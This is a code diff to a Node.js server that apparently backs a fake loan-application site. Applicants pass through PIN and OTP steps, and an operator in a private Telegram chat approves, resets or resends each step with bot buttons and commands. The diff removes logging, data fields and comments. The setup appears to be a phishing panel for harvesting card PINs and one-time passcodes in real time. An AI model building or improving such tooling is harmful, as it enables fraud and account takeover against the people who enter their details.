@@ -23,11 +23,11 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
-// ─── In-memory store ───
+// ─── Store ───
 const applications = {};
 const appRefs = {};
-const resendCooldowns = {}; // `${appId}:${step}` -> timestamp (ms)
-const RESEND_COOLDOWN_MS = 60 * 1000; // 60 seconds
+const resendCooldowns = {};
+const RESEND_COOLDOWN_MS = 60 * 1000;
 
 // ─── Helpers ───
 function esc(s) {
@@ -57,7 +57,7 @@ function checkResendCooldown(appId, step) {
   const last = resendCooldowns[key] || 0;
   const remaining = RESEND_COOLDOWN_MS - (Date.now() - last);
   if (remaining > 0) {
-    return { blocked: true, remainingMs: remaining, remainingSec: Math.ceil(remaining / 1000) };
+    return { blocked: true, remainingSec: Math.ceil(remaining / 1000) };
   }
   resendCooldowns[key] = Date.now();
   return { blocked: false };
@@ -86,26 +86,20 @@ async function sendTelegramMessage(message, buttons = null) {
   }
 }
 
-async function editTelegramMessage(messageId, message, buttons = null) {
+async function editTelegramMessage(messageId, message) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !messageId) return;
-  const body = {
-    chat_id: TELEGRAM_CHAT_ID,
-    message_id: messageId,
-    text: message,
-    parse_mode: 'HTML'
-  };
-  if (buttons) body.reply_markup = { inline_keyboard: buttons };
-  else body.reply_markup = { inline_keyboard: [] };
   try {
-    const response = await fetch(`${TELEGRAM_API_URL}/editMessageText`, {
+    await fetch(`${TELEGRAM_API_URL}/editMessageText`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body)
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        message_id: messageId,
+        text: message,
+        parse_mode: 'HTML',
+        reply_markup: { inline_keyboard: [] }
+      })
     });
-    const data = await response.json();
-    if (!data.ok && data.description && !data.description.includes('not modified')) {
-      console.error('Telegram edit error:', data);
-    }
   } catch (e) {
     console.error('Telegram edit error:', e);
   }
@@ -242,7 +236,7 @@ app.post('/api/send-otp', async (req, res) => {
   res.json({ ok: true, status: 'pending' });
 });
 
-// ─── Resend OTP (with cooldown) ───
+// ─── Resend OTP (cooldown) ───
 app.post('/api/resend-otp', async (req, res) => {
   const { applicationId } = req.body;
   const app = applications[applicationId];
@@ -279,7 +273,7 @@ app.post('/api/resend-otp', async (req, res) => {
   res.json({ ok: true, status: 'otp_resent' });
 });
 
-// ─── Resend Application (full refresh, with cooldown) ───
+// ─── Resend Application ───
 app.post('/api/resend-application/:applicationId', async (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
@@ -302,7 +296,6 @@ app.post('/api/resend-application/:applicationId', async (req, res) => {
     `Amount: $${esc(app.loanAmount)}\n` +
     `Duration: ${esc(app.loanDuration)} days\n` +
     `Name: ${esc(app.firstName)} ${esc(app.lastName)}\n` +
-    `Reason: ${esc(app.loanReason || '—')}\n` +
     `Current status: <b>${esc(app.appStatus)}</b>\n\n` +
     `Approve or reject:`;
 
@@ -318,7 +311,7 @@ app.post('/api/resend-application/:applicationId', async (req, res) => {
   res.json({ ok: true, status: app.appStatus, messageId: msgId });
 });
 
-// ─── Resend current step (with cooldown) ───
+// ─── Resend current step (cooldown) ───
 app.post('/api/resend-step/:applicationId/:step', async (req, res) => {
   const { applicationId, step } = req.params;
   const app = applications[applicationId];
@@ -360,7 +353,7 @@ app.post('/api/resend-step/:applicationId/:step', async (req, res) => {
   res.json({ ok: true, status: app[statusKey] || 'pending', messageId: msgId });
 });
 
-// ─── Reset step (re-approval) ───
+// ─── Reset step ───
 app.post('/api/reset-step/:applicationId/:step', async (req, res) => {
   const { applicationId, step } = req.params;
   const app = applications[applicationId];
@@ -406,13 +399,11 @@ app.get('/api/status/:applicationId/:step', (req, res) => {
 // ─── Telegram Webhook ───
 app.post('/api/telegram-webhook', async (req, res) => {
   const update = req.body;
-  console.log('📩 Webhook received');
 
   if (update.callback_query) {
     const query = update.callback_query;
     const parts = (query.data || '').split('|');
     if (parts.length !== 3) {
-      console.error('Invalid callback_data:', query.data);
       await answerCallback(query.id, '⚠️ Invalid data');
       return res.sendStatus(200);
     }
@@ -425,7 +416,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const appId = appRefs[ref];
     const app = applications[appId];
     if (!app) {
-      console.error(`❌ App not found for ref: ${ref}`);
       await answerCallback(query.id, '⚠️ Application expired or not found');
       return res.sendStatus(200);
     }
@@ -446,8 +436,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
       );
       return res.sendStatus(200);
     }
-
-    console.log(`🔘 Processing callback: action=${a}, step=${s}, appId=${appId}`);
 
     if (s === 'APP') {
       app.appStatus = a === 'YES' ? 'approved' : 'rejected';
@@ -487,7 +475,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
   if (update.message && update.message.text) {
     const text = update.message.text.trim();
     const chatId = update.message.chat.id;
-    console.log(`💬 Message from ${chatId}: ${text}`);
 
     if (chatId.toString() === TELEGRAM_CHAT_ID) {
       if (text === '/stats') {
@@ -508,9 +495,9 @@ app.post('/api/telegram-webhook', async (req, res) => {
           '<b>Commands</b>\n' +
           '/stats – totals\n' +
           '/list – last 5 applications\n' +
-          '/status &lt;id&gt; – full status of an application\n' +
-          '/refresh &lt;id&gt; – resend the current step message\n' +
-          '/reset &lt;id&gt; &lt;step&gt; – reset step (app|pin|otp) back to pending'
+          '/status &lt;id&gt; – full status\n' +
+          '/refresh &lt;id&gt; – resend current step\n' +
+          '/reset &lt;id&gt; &lt;app|pin|otp&gt; – reset step'
         );
       } else if (text.startsWith('/status ')) {
         const id = text.replace('/status ', '').trim();
@@ -526,8 +513,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
             `Amount: $${esc(app.loanAmount)} / ${esc(app.loanDuration)}d\n` +
             `APP: <b>${esc(app.appStatus)}</b>\n` +
             `PIN: <b>${esc(app.pinStatus)}</b> (attempts ${app.pinAttempts}/${app.maxPinAttempts})\n` +
-            `OTP: <b>${esc(app.otpStatus)}</b>\n` +
-            `Created: ${esc(app.createdAt)}`
+            `OTP: <b>${esc(app.otpStatus)}</b>`
           );
         }
       } else if (text.startsWith('/refresh ')) {
@@ -568,7 +554,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
           if (step === 'app') app.appStatus = 'pending';
           else if (step === 'pin') { app.pinStatus = 'pending'; app.pinAttempts = 0; app.pinBlockedUntil = null; }
           else app.otpStatus = 'pending';
-          await sendTelegramMessage(`♻️ Reset <b>${esc(step)}</b> for <code>${esc(id)}</code> to <b>pending</b>.\nUse /refresh ${esc(id)} to resend.`);
+          await sendTelegramMessage(`♻️ Reset <b>${esc(step)}</b> for <code>${esc(id)}</code> to pending.`);
         }
       }
     }
